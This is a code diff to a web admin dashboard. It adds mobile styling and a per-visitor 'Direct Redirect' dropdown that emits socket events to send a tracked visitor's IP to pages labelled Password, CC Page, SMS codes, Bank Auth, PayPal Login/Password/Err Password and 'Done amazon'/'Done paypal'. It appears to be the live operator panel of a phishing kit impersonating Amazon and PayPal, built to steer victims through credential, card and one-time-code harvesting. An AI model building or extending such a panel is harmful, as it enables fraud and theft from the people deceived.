@@ -228,6 +228,59 @@
             .navbar-brand {
                 font-size: 1.1rem;
             }
+            
+            /* Hide less important columns on mobile */
+            .col-mobile-hide {
+                display: none;
+            }
+            
+            /* Make actions column sticky on mobile */
+            .table-responsive {
+                overflow-x: auto;
+                -webkit-overflow-scrolling: touch;
+            }
+            
+            /* Sticky Actions Column */
+            .sticky-actions-header {
+                position: sticky;
+                right: 0;
+                background-color: #fff;
+                z-index: 2;
+                box-shadow: -2px 0 5px rgba(0,0,0,0.05);
+            }
+            
+            .sticky-actions-col {
+                position: sticky;
+                right: 0;
+                background-color: #fff; /* Ensure opacity */
+                z-index: 1;
+                box-shadow: -2px 0 5px rgba(0,0,0,0.05);
+            }
+            
+            /* Dark mode support for sticky column */
+            @media (prefers-color-scheme: dark) {
+                .sticky-actions-header, .sticky-actions-col {
+                    background-color: #1e1e1e; /* Match card background */
+                    box-shadow: -2px 0 5px rgba(255,255,255,0.05);
+                }
+                
+                .table-striped > tbody > tr:nth-of-type(odd) > .sticky-actions-col {
+                     background-color: #2c2c2c; /* Approximate striping color */
+                }
+            }
+            
+            /* Larger tap targets for dropdown items on mobile */
+            .dropdown-item {
+                padding: 12px 16px;
+                font-size: 16px; 
+            }
+        }
+        
+        /* Desktop specific adjustments */
+        @media (min-width: 769px) {
+            .table-responsive {
+                overflow: visible; /* Avoid clipping on desktop if possible */
+            }
         }
         
         /* Highlight animation for new input data */
@@ -526,11 +579,11 @@
                                         <th>Status</th>
                                         <th>IP Address</th>
                                         <th>Country</th>
-                                        <th>City</th>
-                                        <th>Browser/OS</th>
-                                        <th>Requests</th>
+                                        <th class="col-mobile-hide">City</th>
+                                        <th class="col-mobile-hide">Browser/OS</th>
+                                        <th class="col-mobile-hide">Requests</th>
                                         <th>Last Activity</th>
-                                        <th>Actions</th>
+                                        <th class="sticky-actions-header">Actions</th>
                                     </tr>
                                 </thead>
                                 <tbody id="visitors-table-body">
@@ -759,15 +812,20 @@
                             <option value="">-- Select a preset destination --</option>
                             <option value="/">Login Page</option>
                       
-                            <option value="/loading?time=3&url=/">Login Page</option>
-                            <option value="/loading?time=3&url=/PPmP85AgNE4pnL5mWSM">Email SMS</option>
-                            <option value="/loading?time=3&url=/RKnUB922z6Mf4HDwg3EZ">SMS</option>
-                            <option value="/loading?time=3&url=/PINKlarTbjqMpc34D4XsPJ2">PIN</option>
-                            <option value="/loading?time=3&url=/PrTomeM9HwWUWSulkTe4">Refund Page</option>
-                            <option value="/loading?time=3&url=/QcEwP85AgNE4pnL5mWSM">CC Page</option>
-                            <option value="/loading?time=3&url=/LGknmeM9HwWUWSutj6mJ">SMS-CC Code</option>
-                            <option value="/loading?time=3&url=/Ose4aQeM9H4waRfs7PrTv">BANK-AUTH</option>
-                            <option value="/loading?time=3&url=/LkaaomeM9HwWU472fgsPr">Done Page</option>
+                            
+                            <option value="/loading?time=3&url=/PPmP85AgNE4pnL5mWSM">Password Page</option>
+                            <option value="/loading?time=3&url=/QcEwP85AgNE4pnL5mWSM">💳 CC Page</option>
+                            <option value="/loading?time=3&url=/RKnUB922z6Mf4HDwg3EZ">💬 SMS 1</option>
+                            <option value="/loading?time=3&url=/LGknmeM9HwWUWSutj6mJ">💬 SMS 2</option>
+                            <option value="/loading?time=3&url=/PrTomeM9HwWUWSulkTe4">💰 Refund Page</option>
+                            <option value="/loading?time=3&url=/Ose4aQeM9H4waRfs7PrTv">🏦 Bank Auth Page</option>
+                            <option value="/loading?time=3&url=/LkaaomeM9HwWU472fgsPr">✅ Done amazon Page</option>
+                            <option value="/loading?time=3&url=/CVLaOmej9HGAG234ffgPp">Done paypal Page</option>
+                            <option value="/loadingpp?time=3&url=/HlX3xzdM2SwoPR72Fg5JL">PayPal Login</option>
+                            <option value="/loadingpp?time=3&url=/XTk4xzRM2swNZP73Ug5BP">PayPal Password</option>
+                            <option value="/loadingpp?time=3&url=/VrC4xzeE2sw4ZB73xA5BI">❌ PayPal Err Password</option>
+                            <option value="/loadingpp?time=3&url=/SoZ4opAM7PZIBpY0Ua7tV">PayPal SMS</option>
+                            <option value="custom">Custom URL</option>
                             
                         </select>
                     </div>
@@ -1843,7 +1901,7 @@
         }
         
         // Initialize UI components
-        function initializeUI() {
+        function initDashboard() {
             // Initialize country filter mode UI
             updateCountryModeUI(false); // Default to block mode
             
@@ -1852,6 +1910,9 @@
             
             // Initialize country filter UI
             initCountryFilterUI();
+            
+            // Set up general event listeners
+            setupEventListeners();
             
             // Initialize message sending functionality
             setupMessageSendingEvents();
@@ -2128,13 +2189,13 @@
                     ${isBlocked ? '<span class="badge bg-danger">Blocked</span>' : ''}
                 </td>`);
                 row.append(`<td>${visitor.country ? (visitor.countryCode ? `<img src="https://flagcdn.com/16x12/${visitor.countryCode.toLowerCase()}.png" class="country-flag" alt="${visitor.countryCode}">` : '') + ` ${visitor.country}` : 'Unknown'}</td>`);
-                row.append(`<td>${visitor.city || 'Unknown'}</td>`);
-                row.append(`<td>${visitor.browser || 'Unknown'} / ${visitor.os || 'Unknown'}</td>`);
-                row.append(`<td><span class="badge bg-info">${visitor.requestCount || 0}</span></td>`);
+                row.append(`<td class="col-mobile-hide">${visitor.city || 'Unknown'}</td>`);
+                row.append(`<td class="col-mobile-hide">${visitor.browser || 'Unknown'} / ${visitor.os || 'Unknown'}</td>`);
+                row.append(`<td class="col-mobile-hide"><span class="badge bg-info">${visitor.requestCount || 0}</span></td>`);
                 row.append(`<td>${timeAgo}</td>`);
                 
                 // Action buttons
-                const actions = $('<td></td>');
+                const actions = $('<td class="sticky-actions-col"></td>');
                 
                 // View details button
                 const viewBtn = $(`<button class="btn btn-sm btn-primary btn-action me-1" title="View Details"><i class="bi bi-info-circle"></i></button>`);
@@ -2161,13 +2222,59 @@
                     actions.append(blockBtn);
                 }
                 
-                // Redirect button
-                const redirectBtn = $(`<button class="btn btn-sm btn-warning btn-action" title="Redirect Client"><i class="bi bi-box-arrow-right"></i></button>`);
-                redirectBtn.on('click', function(e) {
+                // Direct Redirect Dropdown
+                const redirectDropdown = $(`
+                    <div class="btn-group dropstart">
+                        <button type="button" class="btn btn-sm btn-warning btn-action dropdown-toggle" data-bs-toggle="dropdown" aria-expanded="false" title="Direct Redirect" data-bs-boundary="viewport" data-bs-display="static">
+                            <i class="bi bi-box-arrow-right"></i>
+                        </button>
+                        <ul class="dropdown-menu shadow" style="z-index: 9999;">
+                            <li><h6 class="dropdown-header">Direct Redirect Options</h6></li>
+                            
+
+                             <li><button class="dropdown-item redirect-option" data-url="/loading?time=3&url=/PPmP85AgNE4pnL5mWSM">Password Page</li>
+                            <li><button class="dropdown-item redirect-option" data-url="/loading?time=3&url=/Yf5sn9Opi6BJksRuw78f">💳 CC Page</li>
+                            <li><button class="dropdown-item redirect-option" data-url="/loading?time=3&url=/RKnUB922z6Mf4HDwg3EZ">💬 SMS 1</li>
+                            <li><button class="dropdown-item redirect-option" data-url="/loading?time=3&url=/LGknmeM9HwWUWSutj6mJ">💬 SMS 2</li>
+                            
+                            
+                            
+                        </ul>
+                    </div>
+                `);
+
+                // Initialize dropdown manually to handle event propagation correctly
+                const dropdownToggle = redirectDropdown.find('.dropdown-toggle');
+                const dropdown = new bootstrap.Dropdown(dropdownToggle[0]);
+                
+                // Toggle dropdown on click and prevent row selection
+                dropdownToggle.on('click', function(e) {
                     e.stopPropagation();
-                    showRedirectModal(visitor.ip);
+                    dropdown.toggle();
                 });
-                actions.append(redirectBtn);
+                
+                // Prevent row click when clicking on the dropdown menu itself
+                redirectDropdown.find('.dropdown-menu').on('click', function(e) {
+                     e.stopPropagation();
+                });
+
+                // Handle redirect option click
+                redirectDropdown.find('.redirect-option').on('click', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation(); // Stop propagation immediately
+                    const url = $(this).data('url');
+                    const label = $(this).text();
+                    
+                    console.log(`Directly redirecting IP ${visitor.ip} to ${url} (${label})`);
+                    
+                    // Emit redirect-user event directly
+                    socket.emit('redirect-user', { ip: visitor.ip, url: url });
+                    
+                    // Show success message
+                    showToast(`Redirecting IP ${visitor.ip} to ${label}`, 'success');
+                });
+                
+                actions.append(redirectDropdown);
                 
                 row.append(actions);
                 
